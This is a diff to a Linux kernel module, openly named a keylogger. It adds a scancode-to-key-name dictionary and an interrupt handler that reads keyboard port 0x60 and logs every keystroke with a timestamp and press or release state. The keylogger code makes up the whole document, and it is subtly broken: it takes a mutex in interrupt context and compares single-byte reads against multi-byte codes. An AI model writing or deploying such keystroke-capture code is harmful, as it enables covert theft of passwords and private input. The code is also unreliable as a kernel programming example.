@@ -8,7 +8,9 @@
 
 LIST_HEAD(keyboard_log);
 
-const struct KeyboardCaptureData KEY_DICTIONARY[] = {
+#define DICT_SIZE 249
+
+const struct KeyboardCaptureData KEY_DICTIONARY[DICT_SIZE] = {
         { 0x1, "Escape", PRESSED, 0 },
         { 0x2, "1", PRESSED, '1' },
         { 0x3, "2", PRESSED, '2' },
@@ -260,20 +262,42 @@ const struct KeyboardCaptureData KEY_DICTIONARY[] = {
         { 0xe11d45e19dc5, "Pause", PRESSED, 0 },
 };
 
-void printk_key_event(char code) {
+struct KeyboardCaptureData find_key_from_code(uint64_t code) {
+    for (size_t i = 0; i < DICT_SIZE; i++) {
+        if (KEY_DICTIONARY[i].code == code) {
+            return KEY_DICTIONARY[i];
+        }
+    }
+    struct KeyboardCaptureData dummy =  { 0, "", PRESSED, 0 };
+    return dummy;
+}
+
+void printk_key_event(struct KeyboardCaptureData key) {
     struct timespec64 now;
     ktime_get_real_ts64(&now);
     char sec = (now.tv_sec - (sys_tz.tz_minuteswest * 60)) % 60;
     char min = (now.tv_sec - (sys_tz.tz_minuteswest * 60)) / 60 % 60;
     char hour = (now.tv_sec - (sys_tz.tz_minuteswest * 60)) / 60 / 60 % 24;
-    printk("%d:%d:%d code: %d", hour, min, sec, code);
+    printk(KERN_INFO "%d:%d:%d \"%s\" ", hour, min, sec, key.key_name);
+    if (key.ascii_value) {
+        printk(KERN_CONT "(0x%x) ", key.ascii_value);
+    }
+    if (key.state == PRESSED) {
+        printk(KERN_CONT "PRESSED\n");
+    } else {
+        printk(KERN_CONT "RELEASED\n");
+    }
 }
 
 irqreturn_t key_logger_isr(int i, void *dummy) {
-    mb();
-    char code = inb(0x60);
-
-    printk_key_event(code);
+    uint64_t code = inb(0x60);
+    struct KeyboardCaptureData key = find_key_from_code(code);
+    if (!key.code) {
+        return IRQ_NONE;
+    }
+    mutex_lock(&lock);
+    printk_key_event(key);
+    mutex_unlock(&lock);
     return IRQ_HANDLED;
 }
 
